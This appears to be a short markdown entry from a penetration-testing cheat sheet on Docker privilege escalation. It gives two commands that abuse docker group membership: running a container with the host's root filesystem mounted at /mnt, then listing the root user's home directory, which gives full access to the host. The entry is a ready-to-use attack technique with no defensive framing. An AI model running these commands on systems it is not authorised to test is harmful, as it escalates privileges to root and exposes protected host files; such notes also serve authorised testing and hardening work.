---
title: "Docker"
date: 2024-7-3
tags: ["docker", "privesc", "container", "escape"]
---

---
### Privesc

#### Abuse docker group

```bash
docker run -v /:/mnt -it bash bash
```

```bash
ls /mnt/root
```

<br>